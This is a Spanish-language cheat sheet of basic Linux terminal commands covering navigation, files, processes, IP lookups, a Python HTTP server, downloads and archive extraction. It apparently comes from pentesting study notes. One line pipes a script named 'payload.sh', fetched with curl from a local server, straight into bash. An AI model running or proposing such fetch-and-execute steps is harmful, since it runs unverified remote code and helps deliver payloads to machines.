---
aliases:
---
---
# Movimiento en Consola 

```bash
pwd        # Muestra la ruta actual en la que te encuentras (Print Working Directory)
ls         # Lista los archivos y carpetas del directorio actual
ls -l      # Lista los archivos con detalles (permisos, tamaño, propietario, fecha, etc.)
ls -a      # Muestra también los archivos ocultos
cd         # Cambia de directorio (Change Directory)
cd ..      # Sube un nivel en el árbol de directorios
cd /ruta   # Va a una ruta específica
mkdir      # Crea un nuevo directorio (Make Directory)
rmdir      # Elimina un directorio vacío (Remove Directory)
rm         # Elimina archivos
rm -r      # Elimina directorios y su contenido de forma recursiva
cp         # Copia archivos o directorios
mv         # Mueve o renombra archivos o directorios
cat        # Muestra el contenido de un archivo
more       # Muestra el contenido de un archivo página por página
less       # Similar a more, pero permite desplazarse hacia atrás
touch      # Crea un archivo vacío o actualiza la fecha de modificación
clear      # Limpia la pantalla de la terminal
echo       # Muestra un texto o variable por pantalla
whoami     # Muestra el nombre del usuario actual
df -h      # Muestra el uso del disco en formato legible
du -h      # Muestra el tamaño de archivos y directorios
ps         # Muestra procesos en ejecución
top        # Muestra procesos en tiempo real (como el Administrador de tareas)
kill       # Termina un proceso por su PID
man        # Muestra el manual de un comando (por ejemplo: man ls)
history    # Muestra el historial de comandos usados
exit       # Cierra la sesión de la terminal
curl ifconfig.me # Muestra la tu ip publica 
host dominio.com # Ip publica del dominio
whois <Ip> # Muestra datos de la ip 
```

---
### Servidor


- Levantarse un servidor con python por el puerto deseado 

```bash
python3 -m http.server 80  
```

---
### Descarga de Archivos

- Descarga un archivo desde el servidor levantado y que se ejecute con el interprete deseado

```bash
curl http://192.168.1.19/payload.sh | bash  # Se descargar el payload.sh y lo ejecuta con bash
```

- Descarga de Archivos de Dominios

```bash
wget https://example.com/archivo.zip
```

- Descarga de Archivos mediante repositorios de github

```bash
git clone https://github.com/ejemplo.git
```


---

### Comandos para extraer archivos Comprimidos

```bash
gunzip     # Descomprime archivos .gz
gzip -d    # Alternativa a gunzip para archivos .gz
tar -xvf   # Extrae archivos .tar
tar -xzvf  # Extrae archivos .tar.gz o .tgz
tar -xjvf  # Extrae archivos .tar.bz2
tar -xJvf  # Extrae archivos .tar.xz
unzip      # Descomprime archivos .zip
unrar x    # Descomprime archivos .rar (requiere paquete unrar)
7z x       # Descomprime archivos .7z (requiere paquete p7zip)
uncompress # Descomprime archivos .Z
```

